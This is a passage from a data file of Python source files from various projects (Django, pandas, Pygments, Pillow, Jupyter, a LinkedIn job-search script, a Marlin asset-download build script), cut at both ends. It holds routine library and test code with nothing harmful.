        (""force"", ""f"", ""force installation (overwrite existing files)""),
        (""skip-build"", None, ""skip the build steps""),
    ]

    boolean_options = [""force"", ""skip-build""]

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options(""build"", (""build_scripts"", ""build_dir""))
        self.set_undefined_options(
            ""install"",
            (""install_scripts"", ""install_dir""),
            (""force"", ""force""),
            (""skip_build"", ""skip_build""),
        )

    def run(self):
        if not self.skip_build:
            self.run_command(""build_scripts"")
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == ""posix"":
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JY171	JY171-test_deletecell.py	"def cell_is_deletable(nb, index):
    JS = f'return Jupyter.notebook.get_cell({index}).is_deletable();'
    return nb.browser.execute_script(JS)

def remove_all_cells(notebook):
    for i in range(len(notebook.cells)):
        notebook.delete_cell(0)

INITIAL_CELLS = ['print(""a"")', 'print(""b"")', 'print(""c"")']

def test_delete_cells(prefill_notebook):
    a, b, c = INITIAL_CELLS
    notebook = prefill_notebook(INITIAL_CELLS)

    # Validate initial state
    assert notebook.get_cells_contents() == [a, b, c]
    for cell in range(0, 3):
        assert cell_is_deletable(notebook, cell)

    notebook.set_cell_metadata(0, 'deletable', 'false')
    notebook.set_cell_metadata(1, 'deletable', 0
    )
    assert not cell_is_deletable(notebook, 0)
    assert cell_is_deletable(notebook, 1)
    assert cell_is_deletable(notebook, 2)

    # Try to delete cell a (should not be deleted)
    notebook.delete_cell(0)
    assert notebook.get_cells_contents() == [a, b, c]

    # Try to delete cell b (should succeed)
    notebook.delete_cell(1)
    assert notebook.get_cells_contents() == [a, c]

    # Try to delete cell c (should succeed)
    notebook.delete_cell(1)
    assert notebook.get_cells_contents() == [a]

    # Change the deletable state of cell a
    notebook.set_cell_metadata(0, 'deletable', 'true')

    # Try to delete cell a (should succeed)
    notebook.delete_cell(0)
    assert len(notebook.cells) == 1 # it contains an empty cell

    # Make sure copied cells are deletable
    notebook.edit_cell(index=0, content=a)
    notebook.set_cell_metadata(0, 'deletable', 'false')
    assert not cell_is_deletable(notebook, 0)
    notebook.to_command_mode()
    notebook.current_cell.send_keys('cv')
    assert len(notebook.cells) == 2
    assert cell_is_deletable(notebook, 1)

    notebook.set_cell_metadata(0, 'deletable', 'true')  # to perform below test, remove all the cells
    remove_all_cells(notebook)
    assert len(notebook.cells) == 1    # notebook should create one automatically on empty notebook"
JY480	JY480-forms.py	"import os.path

from django import forms
from django.contrib.admin.helpers import ActionForm
from django.utils.translation import gettext_lazy as _


class ImportForm(forms.Form):
    import_file = forms.FileField(
        label=_('File to import')
        )
    input_format = forms.ChoiceField(
        label=_('Format'),
        choices=(),
        )

    def __init__(self, import_formats, *args, **kwargs):
        super().__init__(*args, **kwargs)
        choices = []
        for i, f in enumerate(import_formats):
            choices.append((str(i), f().get_title(),))
        if len(import_formats) > 1:
            choices.insert(0, ('', '---'))

        self.fields['input_format'].choices = choices


class ConfirmImportForm(forms.Form):
    import_file_name = forms.CharField(widget=forms.HiddenInput())
    original_file_name = forms.CharField(widget=forms.HiddenInput())
    input_format = forms.CharField(widget=forms.HiddenInput())

    def clean_import_file_name(self):
        data = self.cleaned_data['import_file_name']
        data = os.path.basename(data)
        return data


class ExportForm(forms.Form):
    file_format = forms.ChoiceField(
        label=_('Format'),
        choices=(),
        )

    def __init__(self, formats, *args, **kwargs):
        super().__init__(*args, **kwargs)
        choices = []
        for i, f in enumerate(formats):
            choices.append((str(i), f().get_title(),))
        if len(formats) > 1:
            choices.insert(0, ('', '---'))

        self.fields['file_format'].choices = choices


def export_action_form_factory(formats):
    """"""
    Returns an ActionForm subclass containing a ChoiceField populated with
    the given formats.
    """"""
    class _ExportActionForm(ActionForm):
        """"""
        Action form with export format ChoiceField.
        """"""
        file_format = forms.ChoiceField(
            label=_('Format'), choices=formats, required=False)
    _ExportActionForm.__name__ = str('ExportActionForm')

    return _ExportActionForm"
JD422	JD422-main.py	"import json
import os
import time
import random
from linkedin_api import Linkedin
from dotenv import load_dotenv
import sys

class Scrape():
    def __init__(self, api):
        self.api = api
        
    def read_json(self, filename='jobs.json'):
        with open(filename, 'r') as file:
            return json.load(file)

    def write_json(self, newData):
        with open('jobs.json', 'r+') as file:
            data = self.read_json()
            data['job-list'].append(newData)
            json.dump(data, file)

    def searchJobs(self, apiChosen, numberOfSearches, keywordChosen, offsetNumber):
        jobs = apiChosen.search_jobs(keywordChosen, remote = 1, limit = \
                            numberOfSearches, offset = offsetNumber)
        for job in jobs:
            title = job['title']
            jobID = job['dashEntityUrn'].split(':')[-1] 
            location = job['formattedLocation']
            #jobDetails = api.get_job(jobID)
            jobLink = f'https://www.linkedin.com/jobs/view/{jobID}/'
            job = {
                ""Job title"":title,
                ""Job link"":jobLink,
                ""Location"":location
            }
            print(f""{title} : {jobID} : {location}"")
            self.write_json(job)
        

    def findSWEJobs(self, apiChosen):
        listOfJobs = [""Software Developer"",""Software Engineer"", ""Software Intern"",""SDET"",""Developer Intern"",""Software co-op"",""Junior Developer""] 
        for i in range(11,101):
            
            for element in listOfJobs:
                self.searchJobs(apiChosen, 1, element, i)
                time.sleep(1*random.randint(1,5)+2)
    
if(__name__ == ""__main__""):
    load_dotenv()
    Password = os.getenv('PASSWORD')
    Email = os.getenv('EMAIL')
    api = Linkedin(Email, Password)
    data = {""job-list"": [{}]}
    with open('jobs.json', 'w') as file:
        json.dump(data, file)

    scraper = Scrape(api)
    scraper.findSWEJobs(api)
    
    "
JY78	JY78-autoreload.py	"from pathlib import Path

from django.dispatch import receiver
from django.template import engines
from django.template.backends.django import DjangoTemplates
from django.utils._os import to_path
from django.utils.autoreload import autoreload_started, file_changed, is_django_path


def get_template_directories():
    # Iterate through each template backend and find
    # any template_loader that has a 'get_dirs' method.
    # Collect the directories, filtering out Django templates.
    cwd = Path.cwd()
    items = set()
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue

        items.update(cwd / to_path(dir) for dir in backend.engine.dirs if dir)

        for loader in backend.engine.template_loaders:
            if not hasattr(loader, ""get_dirs""):
                continue
            items.update(
                cwd / to_path(directory)
                for directory in loader.get_dirs()
                if directory and not is_django_path(directory)
            )
    return items


def reset_loaders():
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue
        for loader in backend.engine.template_loaders:
            loader.reset()


@receiver(autoreload_started, dispatch_uid=""template_loaders_watch_changes"")
def watch_for_template_changes(sender, **kwargs):
    for directory in get_template_directories():
        sender.watch_dir(directory, ""**/*"")


@receiver(file_changed, dispatch_uid=""template_loaders_file_changed"")
def template_changed(sender, file_path, **kwargs):
    if file_path.suffix == "".py"":
        return
    for template_dir in get_template_directories():
        if template_dir in file_path.parents:
            reset_loaders()
            return True"
JY259	JY259-signals.py	"from .models import OrderedDrug, Order
from django.dispatch import receiver
from django.db.models.signals import post_save, post_delete
from notifications_app.tasks import create_notification, delete_notifications
from django.db.transaction import on_commit
from .tasks import set_drug_quantity
from django.contrib.auth import get_user_model

User = get_user_model()


@receiver(post_save, sender=OrderedDrug)
def reduce_drug_quantity(instance, **kwargs):
    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, -instance.quantity))


@receiver(post_delete, sender=OrderedDrug)
def rollback_drug_quantity(instance, **kwargs):
    on_commit(lambda: set_drug_quantity.delay(instance.drug.id, instance.quantity))


@receiver(post_save, sender=Order)
def send_creation_notif(instance, created, **kwargs):
    if created:
        admin = User.objects.get(is_staff=1)
        data = {
            ""sender_id"": instance.user.id,
            ""receiver_id"": admin.id,
            ""options"": {
                ""message"": f""the user {instance.user.full_name} asks order"",
                ""order_id"": instance.id,
            },
        }
        on_commit(lambda: create_notification.delay(**data))


@receiver(post_save, sender=Order)
def send_approving_notif(instance, **kwargs):
    if instance.status == ""Completed"":
        admin = User.objects.get(is_staff=1)
        data = {
            ""sender_id"": admin.id,
            ""receiver_id"": instance.user.id,
            ""options"": {
                ""message"": f""the admin approve your order order"",
                ""order_id"": instance.id,
            },
        }
        on_commit(lambda: create_notification.delay(**data))


@receiver(post_delete, sender=Order)
def send_notification(instance, **kwargs):
    on_commit(lambda: delete_notifications.delay(instance.id, ""order_id""))"
JY433	JY433-filesystem.py	"import codecs
import sys
import typing as t
import warnings

# We do not trust traditional unixes.
has_likely_buggy_unicode_filesystem = (
    sys.platform.startswith(""linux"") or ""bsd"" in sys.platform
)


def _is_ascii_encoding(encoding: t.Optional[str]) -> bool:
    """"""Given an encoding this figures out if the encoding is actually ASCII (which
    is something we don't actually want in most cases). This is necessary
    because ASCII comes under many names such as ANSI_X3.4-1968.
    """"""
    if encoding is None:
        return False
    try:
        return codecs.lookup(encoding).name == ""ascii""
    except LookupError:
        return False


class BrokenFilesystemWarning(RuntimeWarning, UnicodeWarning):
    """"""The warning used by Werkzeug to signal a broken filesystem. Will only be
    used once per runtime.""""""


_warned_about_filesystem_encoding = False


def get_filesystem_encoding() -> str:
    """"""Returns the filesystem encoding that should be used. Note that this is
    different from the Python understanding of the filesystem encoding which
    might be deeply flawed. Do not use this value against Python's string APIs
    because it might be different. See :ref:`filesystem-encoding` for the exact
    behavior.

    The concept of a filesystem encoding in generally is not something you
    should rely on. As such if you ever need to use this function except for
    writing wrapper code reconsider.
    """"""
    global _warned_about_filesystem_encoding
    rv = sys.getfilesystemencoding()
    if has_likely_buggy_unicode_filesystem and not rv or _is_ascii_encoding(rv):
        if not _warned_about_filesystem_encoding:
            warnings.warn(
                ""Detected a misconfigured UNIX filesystem: Will use""
                f"" UTF-8 as filesystem encoding instead of {rv!r}"",
                BrokenFilesystemWarning,
            )
            _warned_about_filesystem_encoding = True
        return ""utf-8""
    return rv"
JY431	JY431-globals.py	"import typing as t
from threading import local

if t.TYPE_CHECKING:
    import typing_extensions as te
    from .core import Context

_local = local()


@t.overload
def get_current_context(silent: ""te.Literal[False]"" = False) -> ""Context"":
    ...


@t.overload
def get_current_context(silent: bool = ...) -> t.Optional[""Context""]:
    ...


def get_current_context(silent: bool = False) -> t.Optional[""Context""]:
    """"""Returns the current click context.  This can be used as a way to
    access the current context object from anywhere.  This is a more implicit
    alternative to the :func:`pass_context` decorator.  This function is
    primarily useful for helpers such as :func:`echo` which might be
    interested in changing its behavior based on the current context.

    To push the current context, :meth:`Context.scope` can be used.

    .. versionadded:: 5.0

    :param silent: if set to `True` the return value is `None` if no context
                   is available.  The default behavior is to raise a
                   :exc:`RuntimeError`.
    """"""
    try:
        return t.cast(""Context"", _local.stack[-1])
    except (AttributeError, IndexError) as e:
        if not silent:
            raise RuntimeError(""There is no active click context."") from e

    return None


def push_context(ctx: ""Context"") -> None:
    """"""Pushes a new context to the current stack.""""""
    _local.__dict__.setdefault(""stack"", []).append(ctx)


def pop_context() -> None:
    """"""Removes the top level from the stack.""""""
    _local.stack.pop()


def resolve_color_default(color: t.Optional[bool] = None) -> t.Optional[bool]:
    """"""Internal helper to get the default value of the color flag.  If a
    value is passed it's returned unchanged, otherwise it's looked up from
    the current context.
    """"""
    if color is not None:
        return color

    ctx = get_current_context(silent=True)

    if ctx is not None:
        return ctx.color

    return None"
JD358	JD358-__init__.py	"# coding: utf-8

if False:  # MYPY
    from typing import Dict, Any  # NOQA

_package_data = dict(
    full_package_name='ruamel.yaml',
    version_info=(0, 17, 21),
    __version__='0.17.21',
    version_timestamp='2022-02-12 09:49:22',
    author='Anthon van der Neut',
    author_email='a.van.der.neut@ruamel.eu',
    description='ruamel.yaml is a YAML parser/emitter that supports roundtrip preservation of comments, seq/map flow style, and map key order',  # NOQA
    entry_points=None,
    since=2014,
    extras_require={
        ':platform_python_implementation==""CPython"" and python_version<""3.11""': ['ruamel.yaml.clib>=0.2.6'],  # NOQA
        'jinja2': ['ruamel.yaml.jinja2>=0.2'],
        'docs': ['ryd'],
    },
    classifiers=[
        'Programming Language :: Python :: 3 :: Only',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: Implementation :: CPython',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'Topic :: Text Processing :: Markup',
        'Typing :: Typed',
    ],
    keywords='yaml 1.2 parser round-trip preserve quotes order config',
    read_the_docs='yaml',
    supported=[(3, 5)],  # minimum
    tox=dict(
        env='*f',  # f for 3.5
        fl8excl='_test/lib',
    ),
    # universal=True,
    python_requires='>=3',
    rtfd='yaml',
)  # type: Dict[Any, Any]


version_info = _package_data['version_info']
__version__ = _package_data['__version__']

try:
    from .cyaml import *  # NOQA

    __with_libyaml__ = True
except (ImportError, ValueError):  # for Jython
    __with_libyaml__ = False

from ruamel.yaml.main import *  # NOQA"
JY314	JY314-test_houghlines.py	"#!/usr/bin/python

'''
This example illustrates how to use Hough Transform to find lines
'''

# Python 2/3 compatibility
from __future__ import print_function

import cv2 as cv
import numpy as np
import sys
import math

from tests_common import NewOpenCVTests

def linesDiff(line1, line2):

    norm1 = cv.norm(line1 - line2, cv.NORM_L2)
    line3 = line1[2:4] + line1[0:2]
    norm2 = cv.norm(line3 - line2, cv.NORM_L2)

    return min(norm1, norm2)

class houghlines_test(NewOpenCVTests):

    def test_houghlines(self):

        fn = ""/samples/data/pic1.png""

        src = self.get_sample(fn)
        dst = cv.Canny(src, 50, 200)

        lines = cv.HoughLinesP(dst, 1, math.pi/180.0, 40, np.array([]), 50, 10)[:,0,:]

        eps = 5
        testLines = [
            #rect1
             [ 232,  25, 43, 25],
             [ 43, 129, 232, 129],
             [ 43, 129,  43,  25],
             [232, 129, 232,  25],
            #rect2
             [251,  86, 314, 183],
             [252,  86, 323,  40],
             [315, 183, 386, 137],
             [324,  40, 386, 136],
            #triangle
             [245, 205, 377, 205],
             [244, 206, 305, 278],
             [306, 279, 377, 205],
            #rect3
             [153, 177, 196, 177],
             [153, 277, 153, 179],
             [153, 277, 196, 277],
             [196, 177, 196, 277]]

        matches_counter = 0

        for i in range(len(testLines)):
            for j in range(len(lines)):
                if linesDiff(testLines[i], lines[j]) < eps:
                    matches_counter += 1

        self.assertGreater(float(matches_counter) / len(testLines), .7)

        lines_acc = cv.HoughLinesWithAccumulator(dst, rho=1, theta=np.pi / 180, threshold=150, srn=0, stn=0)
        self.assertEqual(lines_acc[0,0,2], 192.0)
        self.assertEqual(lines_acc[1,0,2], 187.0)

if __name__ == '__main__':
    NewOpenCVTests.bootstrap()"
JD294	JD294-download_mks_assets.py	"#
# download_mks_assets.py
# Added by HAS_TFT_LVGL_UI to download assets from Makerbase repo
#
import pioutil
if pioutil.is_pio_build():
    Import(""env"")
    import requests,zipfile,tempfile,shutil
    from pathlib import Path

    url = ""https://github.com/makerbase-mks/Mks-Robin-Nano-Marlin2.0-Firmware/archive/0263cdaccf.zip""
    deps_path = Path(env.Dictionary(""PROJECT_LIBDEPS_DIR""))
    zip_path = deps_path / ""mks-assets.zip""
    assets_path = Path(env.Dictionary(""PROJECT_BUILD_DIR""), env.Dictionary(""PIOENV""), ""assets"")

    def download_mks_assets():
        print(""Downloading MKS Assets"")
        r = requests.get(url, stream=True)
        # the user may have a very clean workspace,
        # so create the PROJECT_LIBDEPS_DIR directory if not exits
        if not deps_path.exists():
            deps_path.mkdir()
        with zip_path.open('wb') as fd:
            for chunk in r.iter_content(chunk_size=128):
                fd.write(chunk)

    def copy_mks_assets():
        print(""Copying MKS Assets"")
        output_path = Path(tempfile.mkdtemp())
        zip_obj = zipfile.ZipFile(zip_path, 'r')
        zip_obj.extractall(output_path)
        zip_obj.close()
        if assets_path.exists() and not assets_path.is_dir():
            assets_path.unlink()
        if not assets_path.exists():
            assets_path.mkdir()
        base_path = ''
        for filename in output_path.iterdir():
            base_path = filename
        fw_path = (output_path / base_path / 'Firmware')
        font_path = fw_path / 'mks_font'
        for filename in font_path.iterdir():
            shutil.copy(font_path / filename, assets_path)
        pic_path = fw_path / 'mks_pic'
        for filename in pic_path.iterdir():
            shutil.copy(pic_path / filename, assets_path)
        shutil.rmtree(output_path, ignore_errors=True)

    if not zip_path.exists():
        download_mks_assets()

    if not assets_path.exists():
        copy_mks_assets()"
JY490	JY490-__init__.py	"""""""Pillow (Fork of the Python Imaging Library)

Pillow is the friendly PIL fork by Alex Clark and Contributors.
    https://github.com/python-pillow/Pillow/

Pillow is forked from PIL 1.1.7.

PIL is the Python Imaging Library by Fredrik Lundh and Contributors.
Copyright (c) 1999 by Secret Labs AB.

Use PIL.__version__ for this Pillow version.

;-)
""""""

from . import _version

# VERSION was removed in Pillow 6.0.0.
# PILLOW_VERSION was removed in Pillow 9.0.0.
# Use __version__ instead.
__version__ = _version.__version__
del _version


_plugins = [
    ""BlpImagePlugin"",
    ""BmpImagePlugin"",
    ""BufrStubImagePlugin"",
    ""CurImagePlugin"",
    ""DcxImagePlugin"",
    ""DdsImagePlugin"",
    ""EpsImagePlugin"",
    ""FitsImagePlugin"",
    ""FitsStubImagePlugin"",
    ""FliImagePlugin"",
    ""FpxImagePlugin"",
    ""FtexImagePlugin"",
    ""GbrImagePlugin"",
    ""GifImagePlugin"",
    ""GribStubImagePlugin"",
    ""Hdf5StubImagePlugin"",
    ""IcnsImagePlugin"",
    ""IcoImagePlugin"",
    ""ImImagePlugin"",
    ""ImtImagePlugin"",
    ""IptcImagePlugin"",
    ""JpegImagePlugin"",
    ""Jpeg2KImagePlugin"",
    ""McIdasImagePlugin"",
    ""MicImagePlugin"",
    ""MpegImagePlugin"",
    ""MpoImagePlugin"",
    ""MspImagePlugin"",
    ""PalmImagePlugin"",
    ""PcdImagePlugin"",
    ""PcxImagePlugin"",
    ""PdfImagePlugin"",
    ""PixarImagePlugin"",
    ""PngImagePlugin"",
    ""PpmImagePlugin"",
    ""PsdImagePlugin"",
    ""SgiImagePlugin"",
    ""SpiderImagePlugin"",
    ""SunImagePlugin"",
    ""TgaImagePlugin"",
    ""TiffImagePlugin"",
    ""WebPImagePlugin"",
    ""WmfImagePlugin"",
    ""XbmImagePlugin"",
    ""XpmImagePlugin"",
    ""XVThumbImagePlugin"",
]


class UnidentifiedImageError(OSError):
    """"""
    Raised in :py:meth:`PIL.Image.open` if an image cannot be opened and identified.
    """"""

    pass"
JD164	JD164-consumidores.py	"import datetime
import pulsar
import _pulsar
from pulsar.schema import *
import uuid
import time
import logging
import traceback
import uuid

from ordenes.modulos.ordenes.infraestructura.schema.v1.comandos import ComandoCrearOrden
from ordenes.modulos.ordenes.aplicacion.comandos.crear_orden import CrearOrden, CrearOrdenItems
from ordenes.seedwork.infraestructura import utils
from ordenes.seedwork.aplicacion.comandos import ejecutar_commando



def suscribirse_a_comandos():
    cliente = None
    try:
        cliente = pulsar.Client(f'{utils.broker_connection_string()}', authentication=utils.broker_auth())
        consumidor = cliente.subscribe('comandos-orden', consumer_type=_pulsar.ConsumerType.Shared,
                                       subscription_name='ordenes-sub-comandos', schema=AvroSchema(ComandoCrearOrden))

        while True:
            mensaje = consumidor.receive()
            print(f'Comando recibido: {mensaje.value().data}')
            
            orden_dto = mensaje.value().data
            print(""===Se realizan las validaciones de pedido y se asigna un id==="")
            comando = CrearOrden (
                fecha_creacion=int(datetime.datetime.utcnow().timestamp()),
                guid=str(uuid.uuid4()),
                # Llega una orden y la convierto a mi centro de distribuccion
                items=[
                    CrearOrdenItems(
                        guid=str(uuid.uuid4()),
                        direccion_recogida=item.direccion_recogida,
                        direccion_entrega=item.direccion_entrega,
                        tamanio=item.tamanio,
                        telefono=item.telefono
                    ) for item in orden_dto.items
                ]
            )
            
            ejecutar_commando(comando)

            consumidor.acknowledge(mensaje)

        cliente.close()
    except:
        logging.error('ERROR: Suscribiendose al tópico de eventos!')
        traceback.print_exc()
        if cliente:
            cliente.close()"
JY179	JY179-test_start_kernel.py	"from textwrap import dedent

from flaky import flaky

from .test_embed_kernel import setup_kernel

TIMEOUT = 15


@flaky(max_runs=3)
def test_ipython_start_kernel_userns():
    cmd = dedent(
        """"""
        from ipykernel.kernelapp import launch_new_instance
        ns = {""tre"": 123}
        launch_new_instance(user_ns=ns)
        """"""
    )

    with setup_kernel(cmd) as client:
        client.inspect(""tre"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""123"" in text

        # user_module should be an instance of DummyMod
        client.execute(""usermod = get_ipython().user_module"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""status""] == ""ok""
        client.inspect(""usermod"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""DummyMod"" in text


@flaky(max_runs=3)
def test_ipython_start_kernel_no_userns():
    # Issue #4188 - user_ns should be passed to shell as None, not {}
    cmd = dedent(
        """"""
        from ipykernel.kernelapp import launch_new_instance
        launch_new_instance()
        """"""
    )

    with setup_kernel(cmd) as client:
        # user_module should not be an instance of DummyMod
        client.execute(""usermod = get_ipython().user_module"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""status""] == ""ok""
        client.inspect(""usermod"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""DummyMod"" not in text"
JD511	JD511-test_unique.py	"from datetime import (
    datetime,
    timedelta,
)

from pandas import (
    DatetimeIndex,
    NaT,
    Timestamp,
)
import pandas._testing as tm


def test_unique(tz_naive_fixture):

    idx = DatetimeIndex([""2017""] * 2, tz=tz_naive_fixture)
    expected = idx[:1]

    result = idx.unique()
    tm.assert_index_equal(result, expected)
    # GH#21737
    # Ensure the underlying data is consistent
    assert result[0] == expected[0]


def test_index_unique(rand_series_with_duplicate_datetimeindex):
    dups = rand_series_with_duplicate_datetimeindex
    index = dups.index

    uniques = index.unique()
    expected = DatetimeIndex(
        [
            datetime(2000, 1, 2),
            datetime(2000, 1, 3),
            datetime(2000, 1, 4),
            datetime(2000, 1, 5),
        ]
    )
    assert uniques.dtype == ""M8[ns]""  # sanity
    tm.assert_index_equal(uniques, expected)
    assert index.nunique() == 4

    # GH#2563
    assert isinstance(uniques, DatetimeIndex)

    dups_local = index.tz_localize(""US/Eastern"")
    dups_local.name = ""foo""
    result = dups_local.unique()
    expected = DatetimeIndex(expected, name=""foo"")
    expected = expected.tz_localize(""US/Eastern"")
    assert result.tz is not None
    assert result.name == ""foo""
    tm.assert_index_equal(result, expected)


def test_index_unique2():
    # NaT, note this is excluded
    arr = [1370745748 + t for t in range(20)] + [NaT.value]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_index_unique3():
    arr = [
        Timestamp(""2013-06-09 02:42:28"") + timedelta(seconds=t) for t in range(20)
    ] + [NaT]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_is_unique_monotonic(rand_series_with_duplicate_datetimeindex):
    index = rand_series_with_duplicate_datetimeindex.index
    assert not index.is_unique"
JY21	JY21-vim.py	"""""""
    pygments.styles.vim
    ~~~~~~~~~~~~~~~~~~~

    A highlighting style for Pygments, inspired by vim.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace, Token


class VimStyle(Style):
    """"""
    Styles somewhat like vim 7.0
    """"""

    background_color = ""#000000""
    highlight_color = ""#222222""

    styles = {
        Token:                     ""#cccccc"",
        Whitespace:                """",
        Comment:                   ""#000080"",
        Comment.Preproc:           """",
        Comment.Special:           ""bold #cd0000"",

        Keyword:                   ""#cdcd00"",
        Keyword.Declaration:       ""#00cd00"",
        Keyword.Namespace:         ""#cd00cd"",
        Keyword.Pseudo:            """",
        Keyword.Type:              ""#00cd00"",

        Operator:                  ""#3399cc"",
        Operator.Word:             ""#cdcd00"",

        Name:                      """",
        Name.Class:                ""#00cdcd"",
        Name.Builtin:              ""#cd00cd"",
        Name.Exception:            ""bold #666699"",
        Name.Variable:             ""#00cdcd"",

        String:                    ""#cd0000"",
        Number:                    ""#cd00cd"",

        Generic.Heading:           ""bold #000080"",
        Generic.Subheading:        ""bold #800080"",
        Generic.Deleted:           ""#cd0000"",
        Generic.Inserted:          ""#00cd00"",
        Generic.Error:             ""#FF0000"",
        Generic.Emph:              ""italic"",
        Generic.Strong:            ""bold"",
        Generic.Prompt:            ""bold #000080"",
        Generic.Output:            ""#888"",
        Generic.Traceback:         ""#04D"",

        Error:                     ""border:#FF0000""
    }"
JD96	JD96-managers.py	"from django.conf import settings
from django.core import checks
from django.core.exceptions import FieldDoesNotExist
from django.db import models


class CurrentSiteManager(models.Manager):
    ""Use this to limit objects to those associated with the current site.""

    use_in_migrations = True

    def __init__(self, field_name=None):
        super().__init__()
        self.__field_name = field_name

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_field_name())
        return errors

    def _check_field_name(self):
        field_name = self._get_field_name()
        try:
            field = self.model._meta.get_field(field_name)
        except FieldDoesNotExist:
            return [
                checks.Error(
                    ""CurrentSiteManager could not find a field named '%s'."" % field_name,
                    obj=self,
                    id='sites.E001',
                )
            ]

        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):
            return [
                checks.Error(
                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key or a many-to-many field."" % (
                        self.model._meta.object_name, field_name
                    ),
                    obj=self,
                    id='sites.E002',
                )
            ]

        return []

    def _get_field_name(self):
        """""" Return self.__field_name or 'site' or 'sites'. """"""

        if not self.__field_name:
            try:
                self.model._meta.get_field('site')
            except FieldDoesNotExist:
                self.__field_name = 'sites'
            else:
                self.__field_name = 'site'
        return self.__field_name

    def get_queryset(self):
        return super().get_queryset().filter(**{self._get_field_name() + '__id': settings.SITE_ID})"
JY530	JY530-test_formats.py	"import pytest

from pandas import Timestamp

ts_no_ns = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
)
ts_ns = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
    nanosecond=123,
)
ts_ns_tz = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=132263,
    nanosecond=123,
    tz=""UTC"",
)
ts_no_us = Timestamp(
    year=2019,
    month=5,
    day=18,
    hour=15,
    minute=17,
    second=8,
    microsecond=0,
    nanosecond=123,
)


@pytest.mark.parametrize(
    ""ts, timespec, expected_iso"",
    [
        (ts_no_ns, ""auto"", ""2019-05-18T15:17:08.132263""),
        (ts_no_ns, ""seconds"", ""2019-05-18T15:17:08""),
        (ts_no_ns, ""nanoseconds"", ""2019-05-18T15:17:08.132263000""),
        (ts_ns, ""auto"", ""2019-05-18T15:17:08.132263123""),
        (ts_ns, ""hours"", ""2019-05-18T15""),
        (ts_ns, ""minutes"", ""2019-05-18T15:17""),
        (ts_ns, ""seconds"", ""2019-05-18T15:17:08""),
        (ts_ns, ""milliseconds"", ""2019-05-18T15:17:08.132""),
        (ts_ns, ""microseconds"", ""2019-05-18T15:17:08.132263""),
        (ts_ns, ""nanoseconds"", ""2019-05-18T15:17:08.132263123""),
        (ts_ns_tz, ""auto"", ""2019-05-18T15:17:08.132263123+00:00""),
        (ts_ns_tz, ""hours"", ""2019-05-18T15+00:00""),
        (ts_ns_tz, ""minutes"", ""2019-05-18T15:17+00:00""),
        (ts_ns_tz, ""seconds"", ""2019-05-18T15:17:08+00:00""),
        (ts_ns_tz, ""milliseconds"", ""2019-05-18T15:17:08.132+00:00""),
        (ts_ns_tz, ""microseconds"", ""2019-05-18T15:17:08.132263+00:00""),
        (ts_ns_tz, ""nanoseconds"", ""2019-05-18T15:17:08.132263123+00:00""),
        (ts_no_us, ""auto"", ""2019-05-18T15:17:08.000000123""),
    ],
)
def test_isoformat(ts, timespec, expected_iso):
    assert ts.isoformat(timespec=timespec) == expected_iso"
JY6	JY6-filter.py	"""""""
    pygments.filter
    ~~~~~~~~~~~~~~~

    Module that implements the default filter.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""


def apply_filters(stream, filters, lexer=None):
    """"""
    Use this method to apply an iterable of filters to
    a stream. If lexer is given it's forwarded to the
    filter, otherwise the filter receives `None`.
    """"""
    def _apply(filter_, stream):
        yield from filter_.filter(lexer, stream)
    for filter_ in filters:
        stream = _apply(filter_, stream)
    return stream


def simplefilter(f):
    """"""
    Decorator that converts a function into a filter::

        @simplefilter
        def lowercase(self, lexer, stream, options):
            for ttype, value in stream:
                yield ttype, value.lower()
    """"""
    return type(f.__name__, (FunctionFilter,), {
        '__module__': getattr(f, '__module__'),
        '__doc__': f.__doc__,
        'function': f,
    })


class Filter:
    """"""
    Default filter. Subclass this class or use the `simplefilter`
    decorator to create own filters.
    """"""

    def __init__(self, **options):
        self.options = options

    def filter(self, lexer, stream):
        raise NotImplementedError()


class FunctionFilter(Filter):
    """"""
